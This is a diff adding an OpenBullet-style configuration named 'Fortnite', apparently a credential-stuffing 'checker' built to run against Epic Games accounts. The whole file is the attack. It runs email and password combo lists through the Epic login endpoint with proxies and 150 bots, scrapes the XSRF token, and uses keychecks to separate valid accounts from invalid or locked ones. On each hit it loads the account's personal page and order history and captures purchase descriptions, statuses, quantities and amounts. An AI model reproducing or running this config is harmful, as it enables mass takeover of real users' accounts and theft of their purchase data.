@@ -1,0 +1,70 @@
+[SETTINGS]
+{
+  "Name": "Fortnite",
+  "SuggestedBots": 150,
+  "LastModified": "2018-05-16T01:21:04.313212+02:00",
+  "AdditionalInfo": "",
+  "Author": "Chaos",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "MailPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#Get_Main_Page REQUEST GET "https://accounts.epicgames.com/login/doCustomLogin?redirectUrl=https%3A%2F%2Fwww.epicgames.com%2Ffortnite%2F&productName=fortnite" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#Get_Token PARSE "<SOURCE>" LR "ue=\"" "\"" Recursive=FALSE -> VAR "xsrf" "" "" 
+#Post_Data REQUEST POST "https://accounts.epicgames.com/login/doCustomLogin" AutoRedirect=TRUE 
+  CONTENT "X-XSRF-TOKEN=<xsrf>&X-XSRF-URI=%2Flogin%2FdoCustomLogin&fromForm=yes&authType=&linkExtAuth=&redirectUrl=https%3A%2F%2Fwww.epicgames.com%2Ffortnite%2Fen-US%2Fbuy-now%2Fbattle-royale&epic_username=<USER>&password=<PASS>&rememberMe=YES&loginSubheading=Sign%20In&regSubheading=Register&productName=fortnite" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Linux; Android 8.0.0; SM-N950F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.126 Mobile Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#Login_Keywords KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Success OR 
+    KEY "redirectURL" 
+  KEYCHAIN Failure OR 
+    KEY "Sorry the credentials you are using are invalid." 
+    KEY "Sorry, your account is temporarily locked." 
+    KEY "Please reset your password to proceed with login." 
+#Get_Account_Details REQUEST GET "https://www.epicgames.com/account/personal" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#Ready_For_Capture_? KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Success OR 
+    KEY "Personal Details" 
+#Get_Order_History REQUEST GET "https://www.epicgames.com/account/payment/ajaxGetOrderHistory?" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Linux; Android 8.0.0; SM-N950F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.126 Mobile Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "x-requested-with: XMLHttpRequest" 
+#Orders_? KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Success OR 
+    KEY "orderStatus\":\"COMPLETED" 
+  KEYCHAIN Failure OR 
+    KEY "orders\":[]" 
+#Description PARSE "<SOURCE>" LR "description\":\"" "\"" Recursive=TRUE -> CAP "Description" "" "" 
+#Order_Status PARSE "<SOURCE>" LR "orderStatus\":\"" "\"" Recursive=TRUE -> CAP "Order Status" "" "" 
+#Quantity PARSE "<SOURCE>" LR "quantity\":" "," Recursive=TRUE -> CAP "Quantity" "" "" 
+#Amount PARSE "<SOURCE>" LR "amount\":\"" "\"" Recursive=TRUE -> CAP "Amount" "" "" 
